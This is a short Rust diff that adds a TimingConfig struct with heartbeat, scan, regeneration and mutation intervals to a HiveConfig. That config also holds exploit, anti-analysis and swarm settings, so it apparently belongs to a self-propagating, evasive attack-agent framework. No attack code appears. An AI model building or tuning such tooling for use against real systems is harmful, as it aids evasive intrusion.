@@ -16,6 +16,7 @@ pub struct HiveConfig {
     pub exploits: ExploitsConfig,
     pub limits: LimitsConfig,
     pub anti_analysis: AntiAnalysisConfig,
+    pub timing: TimingConfig,
     pub brain: HoneycombConfig,
     pub colony: SwarmConfig,
 }
@@ -94,6 +95,31 @@ pub struct AntiAnalysisConfig {
     pub random_delay_max_secs: u64,
 }
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct TimingConfig {
+    pub heartbeat_interval_secs: u64,
+    pub dead_agent_timeout_secs: u64,
+    pub regeneration_cooldown_secs: u64,
+    pub consensus_timeout_secs: u64,
+    pub decision_interval_secs: u64,
+    pub scan_interval_secs: u64,
+    pub mutation_interval_secs: u64,
+}
+
+impl Default for TimingConfig {
+    fn default() -> Self {
+        Self {
+            heartbeat_interval_secs: 10,
+            dead_agent_timeout_secs: 30,
+            regeneration_cooldown_secs: 60,
+            consensus_timeout_secs: 30,
+            decision_interval_secs: 30,
+            scan_interval_secs: 15,
+            mutation_interval_secs: 120,
+        }
+    }
+}
+
 impl Default for HiveConfig {
     fn default() -> Self {
         Self {
@@ -170,6 +196,7 @@ impl Default for HiveConfig {
                 random_delay_min_secs: 1,
                 random_delay_max_secs: 10,
             },
+            timing: TimingConfig::default(),
             brain: HoneycombConfig::default(),
             colony: SwarmConfig::default(),
         }
